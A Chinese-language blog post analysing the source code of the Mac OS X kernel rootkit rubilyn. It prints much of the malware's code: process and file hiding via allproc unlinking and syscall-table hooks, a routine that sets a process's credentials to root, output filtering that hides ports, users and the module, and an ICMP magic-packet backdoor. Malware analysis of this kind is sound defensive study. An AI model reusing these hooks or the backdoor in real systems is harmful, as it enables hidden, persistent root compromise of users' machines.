<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8" />
  
  <title>Mac OSX rootkit rubilyn 源码分析 | riusksk&#39;s blog</title>
  <meta name="author" content="riusksk" />

  
  <meta name="description" content="1、隐藏进程在mac osx上,每个进程的上下文都保存在proc结构中,而在allproc链表中就保存着所有进程proc结构的指针，通过allproc链表移除相应进程的proc结构可隐藏正在进行的进程，下面是rubilyn中关于隐藏进程的代码，但目测通过ps -p pid 仍可列出进程，因为它并没有" />
  

  

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />

  <meta property="og:title" content="Mac OSX rootkit rubilyn 源码分析" />
  <meta property="og:site_name" content="riusksk&#39;s blog" />

  
  

  
    <meta property="og:image" content="undefined" />
  

  
  <link href="/css/images/favicon.ico" rel="icon" />
  

  <link rel="alternate" href="/atom.xml" title="riusksk&#39;s blog" type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
  
<script>
	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
		(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
			m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
	})(window,document,'script','//www.google-analytics.com/analytics.js','ga');

	ga('create', 'UA-78773323-1', 'auto');
	ga('send', 'pageview');

</script>



  <!-- baidu webmaster push -->
  <script src='//push.zhanzhang.baidu.com/push.js'></script>

</head>


<body>
  <header id="header" class="inner"><div class="alignleft">
  <h1><a href="/">riusksk&#39;s blog</a></h1>
  <h2><a href="/">攀蟾折桂摄寰宇，摘星揽月御乾坤。踏云踩雾骋宵壤，驱风逐日闯天地。 ------泉哥</a></h2>
</div>
<nav id="main-nav" class="alignright">
  <ul>
    
      <li><a href="/">主页</a></li>
    
      <li><a href="/archives">归档</a></li>
    
      <li><a href="/atom.xml">RSS订阅</a></li>
    
      <li><a href="/about">关于</a></li>
    
  </ul>
  <div class="clearfix"></div>
</nav>
<div class="clearfix"></div></header>
  <div id="content" class="inner">
    <div id="main-col" class="alignleft"><div id="wrapper"><article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2012-12-31T16:00:00.000Z"><a href="/2013/01/01/osx_rootkit_rubilyn_analyze/">2013-01-01</a></time>
      
      
  
    <h1 class="title">Mac OSX rootkit rubilyn 源码分析</h1>
  

    </header>
    <div class="entry">
      
        <h3 id="1、隐藏进程"><a href="#1、隐藏进程" class="headerlink" title="1、隐藏进程"></a>1、隐藏进程</h3><p>在mac osx上,每个进程的上下文都保存在proc结构中,而在allproc链表中就保存着所有进程proc结构的指针，通过allproc链表移除相应进程的proc结构可隐藏正在进行的进程，下面是rubilyn中关于隐藏进程的代码，但目测通过ps -p pid 仍可列出进程，因为它并没有移除进程hash列表pidhashtbl中相关的进程信息，导致可通过pid查找到进程。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* modify allproc to hide a specific pid */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">hideproc</span><span class="params">(<span class="keyword">int</span> pid)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">struct</span> proc* p;</span><br><span class="line">    <span class="keyword">if</span>(pid!=<span class="number">0</span>)&#123;</span><br><span class="line">	<span class="comment">// lh.first 指向allproc链表中的第1个元素，而p_list.le_next指向下个proc结构</span></span><br><span class="line">        <span class="keyword">for</span> (p = my_allproc-&gt;lh_first; p != <span class="number">0</span>; p = p-&gt;p_list.le_next) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(pid == p-&gt;p_pid)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(hidden_p_count &lt; MAX_HIDDEN_PROCESS)</span><br><span class="line">                &#123;</span><br><span class="line">                    hidden_p[hidden_p_count]=p;</span><br><span class="line">                    hidden_p_count++;   </span><br><span class="line">                    my_proc_list_lock();</span><br><span class="line">                    LIST_REMOVE(p, p_list); 	<span class="comment">// 移除p_list结构中关于p进程的元素</span></span><br><span class="line">                    my_proc_list_unlock();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="2、隐藏文件"><a href="#2、隐藏文件" class="headerlink" title="2、隐藏文件"></a>2、隐藏文件</h3><p>为了对列出文件的相应系统函数进行挂钩，我们需要先对finder和ls所使用的函数进行进程跟踪，在mac上已经用Dtrace代替ktrace，在finder上主要是使用getdirentriesattr函数，而ls主要是使用getdirentries64，下面是用Dtrace分别对finder和ls的进程跟踪情况, calltrace.d 脚本内容如下：</p>
<figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">riusksk<span class="keyword">@macosx</span>:/usr/include/sys$ cat ~/Reverse\ engineering/Dtrace/calltrace.d </span><br><span class="line">pid$target:::entry</span><br><span class="line">&#123;</span><br><span class="line">   ;</span><br><span class="line">&#125;</span><br><span class="line">pid$target:::<span class="keyword">return</span></span><br><span class="line">&#123;</span><br><span class="line">   printf(<span class="string">"=%d\n"</span>, arg1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下面是查看finder进程2841的调用函数：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">riusksk@macosx:/usr/include/sys$ sudo dtrace -s ~/Reverse\ engineering/Dtrace/calltrace.d -p 2841 | grep getdir</span><br><span class="line">dtrace: script '/Users/riusksk/Reverse engineering/Dtrace/calltrace.d' matched 573227 probes</span><br><span class="line"></span><br><span class="line">  2 1078881          getdirentriesattr:entry </span><br><span class="line">  2 1363229         getdirentriesattr:return =1</span><br></pre></td></tr></table></figure>
<p>下面是ls命令(64位系统)调用的函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">riusksk@macosx:~$ sudo dtrace -s ~/Reverse\ engineering/Dtrace/calltrace.d -c ls | grep getdir</span><br><span class="line">dtrace: script &apos;/Users/riusksk/Reverse engineering/Dtrace/calltrace.d&apos; matched 28745 probes</span><br><span class="line">dtrace: pid 3184 has exited</span><br><span class="line">  2 271609          __getdirentries64:entry </span><br><span class="line">  2 285894         __getdirentries64:return =1980</span><br><span class="line">  2 271609          __getdirentries64:entry </span><br><span class="line">  2 285894         __getdirentries64:return =0</span><br></pre></td></tr></table></figure>
<p>因此，我们若想在finder和ls中隐藏文件，只要对这两个函数 getdirentriesattr 和 getdirentries64 （32位的为getdirentries）进行挂钩处理即可。在系统调用函数表中，主要是由sysent结构数组构成，每个sysent结构中都包括参数个数sy_narg，执行函数sy_call 这些重要数据。sysent结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> sysent &#123; <span class="comment">/* system call table */</span></span><br><span class="line">		<span class="keyword">int16_t</span> sy_narg; <span class="comment">/* number of args */</span></span><br><span class="line">		<span class="keyword">int8_t</span> sy_resv; <span class="comment">/* reserved */</span></span><br><span class="line">		<span class="keyword">int8_t</span> sy_flags; <span class="comment">/* flags */</span></span><br><span class="line">		<span class="keyword">sy_call_t</span> *sy_call; <span class="comment">/* implementing function */</span></span><br><span class="line">		<span class="keyword">sy_munge_t</span> *sy_arg_munge32; <span class="comment">/* system call arguments munger for 32-bit process */</span></span><br><span class="line">		<span class="keyword">sy_munge_t</span> *sy_arg_munge64; <span class="comment">/* system call arguments munger for 64-bit process */</span></span><br><span class="line">		<span class="keyword">int32_t</span> sy_return_type; <span class="comment">/* system call return types */</span></span><br><span class="line">		<span class="keyword">uint16_t</span> sy_arg_bytes; <span class="comment">/* Total size of arguments in bytes for* 32-bit system calls */</span></span><br><span class="line">	&#125;;</span><br></pre></td></tr></table></figure>
<p>为了实现对上述系统函数的挂钩，通过修改相应函数sysent结构的sy_call来进行偷梁换柱，关于各系统函数的调用号和宏名均可在 /usr/include/sys/syscall.h中找到：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">riusksk@macosx:/usr/include/sys$ cat syscall.h | grep getdir</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>	SYS_getdirentries  196</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>	SYS_getdirentriesattr 222</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>	SYS_getdirentries64 344</span></span><br></pre></td></tr></table></figure>
<p>下面是rubilyn中对系统调用函数getdirentries64 和 getdirentriesattr的挂钩代码，将这两个函数替换为自定义的 new_getdirentries64  和 new_getdirentriesattr ，同时保存原函数地址方便获取目录信息并进行篡改：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(nsysent)&#123;</span><br><span class="line">    table = find_sysent();</span><br><span class="line">    <span class="keyword">if</span>(table)&#123;</span><br><span class="line">        <span class="comment">/* back up original syscall pointers */</span>    </span><br><span class="line">        org_getdirentries64 = (void *) table[SYS_getdirentries64].sy_call; 	<span class="comment">// 保存原系统函数地址</span></span><br><span class="line">        org_getdirentriesattr = (void *) table[SYS_getdirentriesattr].sy_call; </span><br><span class="line">        <span class="comment">/* replace syscalls in syscall table */</span></span><br><span class="line">        table[SYS_getdirentries64].sy_call = (void *) new_getdirentries64;	<span class="comment">// 替换原系统函数</span></span><br><span class="line">        table[SYS_getdirentriesattr].sy_call = (void *) new_getdirentriesattr;</span><br></pre></td></tr></table></figure>
<p>两个替换函数执行的操作有点类似，主要是移除指定文件的dirent结构，其中dirent结构原型如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> dirent &#123;</span><br><span class="line">	<span class="keyword">__uint32_t</span> d_fileno; 	<span class="comment">// 节点号</span></span><br><span class="line">	<span class="keyword">__uint16_t</span> d_reclen;	<span class="comment">// 目录项长度</span></span><br><span class="line">	<span class="keyword">__uint8_t</span>  d_type;	<span class="comment">// 文件类型</span></span><br><span class="line">	<span class="keyword">__uint8_t</span>  d_namlen;	<span class="comment">// 文件名</span></span><br><span class="line">   <span class="meta">#<span class="meta-keyword">if</span> __BSD_VISIBLE</span></span><br><span class="line">   <span class="meta">#<span class="meta-keyword">define</span> MAXNAMLEN 255</span></span><br><span class="line">	<span class="keyword">char</span> d_name[MAXNAMLEN+<span class="number">1</span>]; <span class="comment">// 文件名</span></span><br><span class="line">   <span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">	<span class="keyword">char</span> d_name[<span class="number">255</span>+<span class="number">1</span>];	<span class="comment">// 文件名</span></span><br><span class="line">   <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此处我们只看下 new_getdirentries64 函数，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* hooked getdirentries64 and friends */</span></span><br><span class="line"><span class="keyword">register_t</span> new_getdirentries64(<span class="keyword">struct</span> proc *p, <span class="keyword">struct</span> getdirentries64_args *uap, <span class="keyword">user_ssize_t</span> *retval)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> ret; </span><br><span class="line">    <span class="keyword">u_int64_t</span> bcount = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">u_int64_t</span> btot = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> buffersize = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">struct</span> direntry *dirp;</span><br><span class="line">    <span class="keyword">void</span> *mem = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">int</span> updated = <span class="number">0</span>;</span><br><span class="line">    ret = org_getdirentries64(p,uap,retval); <span class="comment">// 调用原函数获取目录信息</span></span><br><span class="line">    btot = buffersize = bcount = *retval;    <span class="comment">// 函数返回的字节数</span></span><br><span class="line">    <span class="keyword">if</span>(bcount &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        MALLOC(mem,<span class="keyword">void</span> *,bcount,M_TEMP,M_WAITOK);  <span class="comment">// 在内核空间分配bcount大小的内存</span></span><br><span class="line">        <span class="keyword">if</span>(mem == <span class="literal">NULL</span>)</span><br><span class="line">            return(ret); </span><br><span class="line">        copyin(uap-&gt;buf, mem, bcount);  <span class="comment">// 将用户空间数据拷贝到刚分配的内核空间</span></span><br><span class="line">        dirp = mem;</span><br><span class="line">        <span class="keyword">while</span>(bcount &gt; <span class="number">0</span> &amp;&amp; dirp-&gt;d_reclen &gt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(dirp-&gt;d_reclen &gt; <span class="number">7</span>)</span><br><span class="line">                <span class="comment">// 搜索指定文件名</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">strncmp</span>(dirp-&gt;d_name,(char*)&amp;k_dir,strlen((char*)&amp;k_dir)) == <span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">char</span> *next = (char *) dirp + dirp-&gt;d_reclen;    <span class="comment">// 下一目录项</span></span><br><span class="line">                    <span class="keyword">u_int64_t</span> offset = (char *) next - (char *) mem ;	<span class="comment">// 当前文件目录项大小</span></span><br><span class="line">                    bcount -= dirp-&gt;d_reclen;   <span class="comment">// 递减字节数</span></span><br><span class="line">                    btot -= dirp-&gt;d_reclen;     <span class="comment">// 递减目录项长度</span></span><br><span class="line">                    bcopy(next,dirp,buffersize - offset);   <span class="comment">// 覆盖指定文件的目录项，从而实现文件隐藏</span></span><br><span class="line">                    updated = <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            bcount -= dirp-&gt;d_reclen;</span><br><span class="line">            dirp = (struct direntry *) ((char *) dirp + dirp-&gt;d_reclen);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(updated == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            copyout(mem,uap-&gt;buf,btot);     <span class="comment">// 将修改后的数据返回给用户空间</span></span><br><span class="line">            *retval = btot; </span><br><span class="line">        &#125;</span><br><span class="line">        FREE(mem,M_TEMP);   <span class="comment">// 释放内核内存</span></span><br><span class="line">    &#125;</span><br><span class="line">    return ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="3、设置Root进程"><a href="#3、设置Root进程" class="headerlink" title="3、设置Root进程"></a>3、设置Root进程</h3><p>先通过pid获取进程proc结构，然后更改其中进程属主字段p_ucred为0，即root属主。源代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">getroot</span><span class="params">(<span class="keyword">int</span> pid)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">struct</span> proc *rootpid;</span><br><span class="line">    <span class="keyword">kauth_cred_t</span> creds;</span><br><span class="line">    rootpid = proc_find(pid);</span><br><span class="line">    <span class="keyword">if</span>(!rootpid)</span><br><span class="line">        return <span class="number">0</span>;</span><br><span class="line">    lck_mtx_lock((<span class="keyword">lck_mtx_t</span>*)&amp;rootpid-&gt;p_mlock);    <span class="comment">// 设置互斥锁</span></span><br><span class="line">    creds = rootpid-&gt;p_ucred;   <span class="comment">// 进程属主</span></span><br><span class="line">    creds = my_kauth_cred_setuidgid(rootpid-&gt;p_ucred,<span class="number">0</span>,<span class="number">0</span>); <span class="comment">// 设置进程属主id为0(root)</span></span><br><span class="line">    rootpid-&gt;p_ucred = creds;</span><br><span class="line">    lck_mtx_unlock((<span class="keyword">lck_mtx_t</span>*)&amp;rootpid-&gt;p_mlock);  <span class="comment">// 解锁</span></span><br><span class="line">    return <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="4、隐藏网络端口、用户名和内核模块"><a href="#4、隐藏网络端口、用户名和内核模块" class="headerlink" title="4、隐藏网络端口、用户名和内核模块"></a>4、隐藏网络端口、用户名和内核模块</h3><p>通过对write_nocancel函数挂钩，然后对 grep、sysctl、netstat、kextstat、w和who等命令的输出结果进行过滤，当命令输出结果中包含rubilyn模块名以及特写端口和用户名时就直接返回，否则就调用原始的write_nocanel函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* hooked write_nocancel for hiding console stuff */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">new_write_nocancel</span><span class="params">(<span class="keyword">struct</span> proc* p, <span class="keyword">struct</span> write_nocancel_args *uap, user_ssize_t* retval)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[MAXBUFFER];</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strncmp</span>(p-&gt;p_comm, grep, strlen(p-&gt;p_comm))==<span class="number">0</span>||<span class="built_in">strncmp</span>(p-&gt;p_comm, sysctl,strlen(p-&gt;p_comm))==<span class="number">0</span>||</span><br><span class="line">       <span class="built_in">strncmp</span>(p-&gt;p_comm, kextstat,strlen(p-&gt;p_comm))==<span class="number">0</span>)&#123;</span><br><span class="line">        bzero(buffer, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">        copyin(uap-&gt;cbuf, buffer, <span class="keyword">sizeof</span>(buffer)<span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">if</span>(my_strstr(buffer, rubilyn))	</span><br><span class="line">            return(uap-&gt;nbyte);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strncmp</span>(p-&gt;p_comm, netstat,strlen(p-&gt;p_comm))==<span class="number">0</span>)&#123;</span><br><span class="line">        bzero(buffer, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">        copyin(uap-&gt;cbuf, buffer, <span class="keyword">sizeof</span>(buffer)<span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">if</span>(my_strstr(buffer, (char*)&amp;k_port))	</span><br><span class="line">            return(uap-&gt;nbyte);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>((strncmp(p-&gt;p_comm,w,strlen(p-&gt;p_comm))==<span class="number">0</span>||strncmp(p-&gt;p_comm,who,strlen(p-&gt;p_comm))==<span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        bzero(buffer, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">        copyin(uap-&gt;cbuf, buffer, <span class="keyword">sizeof</span>(buffer)<span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">if</span>(my_strstr(buffer, (char*)&amp;k_user))	</span><br><span class="line">            return(uap-&gt;nbyte);</span><br><span class="line">    &#125;</span><br><span class="line">    return org_write_nocancel(p,uap,retval);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>5、设置ICMP 后门</p>
<p>首先添加IPv4过滤器ip_filter_ipv4：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/* install IPv4 filter hook */</span></span><br><span class="line"> ipf_addv4(&amp;ip_filter_ipv4, &amp;ip_filter_ipv4_ref);</span><br><span class="line"></span><br><span class="line">ip_filter_ipv4结构如下：</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">struct</span> ipf_filter ip_filter_ipv4 = &#123;</span><br><span class="line">	.name		= <span class="string">"rubilyn"</span>,</span><br><span class="line">	.ipf_input	= ipf_input,</span><br><span class="line">	.ipf_output	= ipf_output,</span><br><span class="line">	.ipf_detach	= ipf_detach,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>当传给用户的ICMP数据包中包含有以下特定数据时就以root权限执行命令：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* ICMP backdoor configuration */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAGIC_ICMP_TYPE 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAGIC_ICMP_CODE 255 <span class="comment">/* xor'd magic word*/</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAGIC_ICMP_STR <span class="string">"\x27\x10\x3\xb\x46\x8\x1c\x10\x1e"</span>  <span class="comment">// 解密后为“n0mn0mn0m”</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAGIC_ICMP_STR_LEN 9</span></span><br></pre></td></tr></table></figure>
<p>ipf_input主要处理传给用户的数据：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> errno_t <span class="title">ipf_input</span><span class="params">(<span class="keyword">void</span>* cookie, mbuf_t *data, <span class="keyword">int</span> offset, u_int8_t protocol)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[IP_BUF_SIZE];</span><br><span class="line">    <span class="keyword">struct</span> icmp *icmp;</span><br><span class="line">    <span class="keyword">if</span> (!(data &amp;&amp; *data))</span><br><span class="line">		return <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (protocol != IPPROTO_ICMP)</span><br><span class="line">		return <span class="number">0</span>;</span><br><span class="line">    mbuf_copydata(*data, offset, IP_BUF_SIZE, buf);</span><br><span class="line">    icmp = (struct icmp *)&amp;buf;</span><br><span class="line">    <span class="comment">// 检测接收的icmp数据包中是否包含后门的特征数据，若是则调用KUNCExecute函数执行命令</span></span><br><span class="line">    <span class="keyword">if</span>(icmp-&gt;icmp_type==MAGIC_ICMP_TYPE&amp;&amp;icmp-&gt;icmp_code== MAGIC_ICMP_CODE &amp;&amp; <span class="built_in">strncmp</span>(icmp-&gt;icmp_data, icmpstr, MAGIC_ICMP_STR_LEN)==<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        my_KUNCExecute((char*)&amp;k_cmd, kOpenAppAsRoot, kOpenApplicationPath);</span><br><span class="line">    &#125;</span><br><span class="line">    return <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>rubilyn还有个命令行控制台rubilyncon，通过输入参数选项来执行上面某项功能，主要都是通过sysctl控制内核变量来招待相应函数，这些内核变量都是在rubilyn中用sysctl注册的，通过这些内核变量可从用户层直接与rubilyn内核扩展进行交互来执行恶意操作。</p>

      
    </div>
    
    <footer>
        <div class="alignright">
          
          <a href="/2013/01/01/osx_rootkit_rubilyn_analyze/#comment" class="comment-link">评论</a>
          
          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
        </div>
        
  
  <div class="categories">
    <a href="/categories/技术分享/">技术分享</a>
  </div>

        
  
  <div class="tags">
    <a href="/tags/OSX/">OSX</a>, <a href="/tags/rootkit/">rootkit</a>
  </div>

        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>


<section id="comment">
  <h1 class="title">留言</h1>

  <!-- 多说评论框 start -->
  <div class="ds-thread" data-thread-key="post-osx_rootkit_rubilyn_analyze" data-title="Mac OSX rootkit rubilyn 源码分析" data-url="http://riusksk.github.io/2013/01/01/osx_rootkit_rubilyn_analyze/"></div>
  <!-- 多说评论框 end -->
  <!-- 多说公共JS代码 start (一个网页只需插入一次) -->
  <script type="text/javascript">
  var duoshuoQuery = {short_name:'riusksk'};
    (function() {
      var ds = document.createElement('script');
      ds.type = 'text/javascript';ds.async = true;
      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
      ds.charset = 'UTF-8';
      (document.getElementsByTagName('head')[0]
       || document.getElementsByTagName('body')[0]).appendChild(ds);
    })();
  </script>
  <!-- 多说公共JS代码 end -->

</section>


</div></div>
    <aside id="sidebar" class="alignright">
  <div class="search">
  <form action="//google.com/search" method="get" accept-charset="utf-8">
    <input type="search" name="q" results="0" placeholder="搜索">
    <input type="hidden" name="q" value="site:riusksk.github.io">
  </form>
</div>

  
<div class="widget tag">
  <h3 class="title">最新文章</h3>
  <ul class="entry">
    
      <li>
        <a href="/2016/07/17/《漏洞战争：软件漏洞分析精要》勘误表/">《漏洞战争：软件漏洞分析精要》勘误表</a>
      </li>
    
      <li>
        <a href="/2016/07/12/《漏洞战争》配套资料下载/">《漏洞战争》配套资料下载</a>
      </li>
    
      <li>
        <a href="/2016/07/02/《漏洞战争：软件漏洞分析精要》已开售/">《漏洞战争：软件漏洞分析精要》已开售</a>
      </li>
    
      <li>
        <a href="/2016/06/23/ios-auditor/">浅谈iOS应用安全自动化审计</a>
      </li>
    
      <li>
        <a href="/2016/06/17/add-articles/">迁移技术文章</a>
      </li>
    
      <li>
        <a href="/2016/05/25/PHDays-2016/">PHDays安全大会议题分析</a>
      </li>
    
      <li>
        <a href="/2016/04/13/CanSecWest_2016/">CanSecWest 2016 大会议题分析</a>
      </li>
    
      <li>
        <a href="/2016/04/05/bh-asia-2016/">BlackHat Asia 2016 大会议题分析报告</a>
      </li>
    
